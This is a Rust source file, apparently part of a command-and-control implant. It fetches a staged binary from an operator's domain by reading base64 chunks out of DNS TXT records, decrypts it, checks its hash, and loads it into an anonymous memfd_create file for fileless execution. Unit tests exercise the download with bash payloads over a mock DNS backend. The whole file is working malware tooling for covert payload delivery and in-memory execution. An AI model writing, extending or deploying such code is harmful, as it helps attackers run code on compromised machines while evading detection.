//! Agent self-update via DNS TXT records.
//!
//! The operator stages a new agent binary using the cradle/staging system,
//! then sends a "selfupdate" task to the agent. The agent fetches the new
//! binary from DNS, verifies its hash, and replaces itself using memfd_create
//! or a temporary file swap.

use crate::crypto::EncryptionKey;
use crate::dns::{DnsBackend, DnsError};
use base64::Engine;

/// Fetch a staged payload from DNS TXT records and return the raw bytes.
///
/// This is the download half of the cradle staging system, used by the agent
/// to fetch payloads (including self-updates) at runtime.
pub async fn fetch_staged_payload(
    backend: &dyn DnsBackend,
    domain: &str,
    label: &str,
    key: Option<&EncryptionKey>,
) -> Result<Vec<u8>, SelfUpdateError> {
    // Read metadata
    let meta_name = format!("_s.meta.{label}.{domain}");
    let meta_records = backend.get_records(&meta_name).await
        .map_err(|e| SelfUpdateError::Fetch(format!("meta: {e}")))?;

    let meta_json = meta_records.first()
        .ok_or_else(|| SelfUpdateError::Fetch("no metadata record".into()))?;

    let meta: StagedMeta = serde_json::from_str(&meta_json.content)
        .map_err(|e| SelfUpdateError::Fetch(format!("meta parse: {e}")))?;

    // Fetch all chunks
    let mut blob = Vec::new();
    for i in 0..meta.chunks {
        let name = format!("_s.{i}.{label}.{domain}");
        let records = backend.get_records(&name).await
            .map_err(|e| SelfUpdateError::Fetch(format!("chunk {i}: {e}")))?;

        if let Some(record) = records.first() {
            blob.push(record.content.clone());
        } else {
            return Err(SelfUpdateError::Fetch(format!("missing chunk {i}")));
        }
    }

    // Decode base64
    let b64_combined = blob.join("");
    let raw = base64::engine::general_purpose::STANDARD.decode(&b64_combined)
        .map_err(|e| SelfUpdateError::Fetch(format!("base64: {e}")))?;

    // Decrypt if key provided. When a key is supplied, ALWAYS decrypt
    // regardless of the metadata `encrypted` flag — the flag comes from
    // untrusted DNS and an attacker could set it to false to bypass decryption.
    let data = if let Some(k) = key {
        crate::crypto::decrypt(k, &raw)
            .map_err(|e| SelfUpdateError::Fetch(format!("decrypt: {e}")))?
    } else {
        raw
    };

    // Verify hash
    let hash = blake3::hash(&data).to_hex()[..32].to_string();
    if hash != meta.hash {
        return Err(SelfUpdateError::HashMismatch {
            expected: meta.hash,
            actual: hash,
        });
    }

    Ok(data)
}

/// Execute a binary from memory using memfd_create (Linux only).
/// Returns the memfd path for execve.
#[cfg(target_os = "linux")]
pub fn memfd_exec_path(binary: &[u8]) -> Result<String, SelfUpdateError> {
    let fd = unsafe {
        libc::syscall(libc::SYS_memfd_create, b"update\0".as_ptr(), 1u32) as i32
    };
    if fd < 0 {
        return Err(SelfUpdateError::ExecFailed("memfd_create failed".into()));
    }

    let written = unsafe {
        libc::write(fd, binary.as_ptr() as *const _, binary.len())
    };
    if written < 0 || written as usize != binary.len() {
        return Err(SelfUpdateError::ExecFailed("memfd write failed".into()));
    }

    Ok(format!("/proc/self/fd/{fd}"))
}

#[cfg(not(target_os = "linux"))]
pub fn memfd_exec_path(_binary: &[u8]) -> Result<String, SelfUpdateError> {
    Err(SelfUpdateError::ExecFailed("memfd_create not available on this platform".into()))
}

#[derive(Debug, serde::Deserialize)]
struct StagedMeta {
    chunks: usize,
    #[allow(dead_code)]
    size: usize,
    hash: String,
    #[serde(default)]
    encrypted: bool,
}

#[derive(Debug, thiserror::Error)]
pub enum SelfUpdateError {
    #[error("fetch error: {0}")]
    Fetch(String),
    #[error("hash mismatch: expected {expected}, got {actual}")]
    HashMismatch { expected: String, actual: String },
    #[error("exec failed: {0}")]
    ExecFailed(String),
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::dns::mock::MockDnsBackend;
    use crate::cradle;

    #[tokio::test]
    async fn test_fetch_staged_payload_roundtrip() {
        let backend = MockDnsBackend::new();
        let data = b"#!/bin/bash\necho hello world\n";

        // Stage the payload
        cradle::stage_payload(&backend, "test.com", "update", data, None)
            .await.unwrap();

        // Fetch it back
        let fetched = fetch_staged_payload(&backend, "test.com", "update", None)
            .await.unwrap();

        assert_eq!(fetched, data);
    }

    #[tokio::test]
    async fn test_fetch_staged_encrypted_roundtrip() {
        let backend = MockDnsBackend::new();
        let data = b"#!/bin/bash\necho encrypted payload\n";
        let key = [0x42u8; 32];

        // Stage encrypted
        cradle::stage_payload_encrypted(&backend, "test.com", "enc", data, None, Some(&key))
            .await.unwrap();

        // Fetch and decrypt
        let fetched = fetch_staged_payload(&backend, "test.com", "enc", Some(&key))
            .await.unwrap();

        assert_eq!(fetched, data);
    }

    #[tokio::test]
    async fn test_fetch_missing_label() {
        let backend = MockDnsBackend::new();
        let result = fetch_staged_payload(&backend, "test.com", "nonexistent", None).await;
        assert!(result.is_err());
    }
}
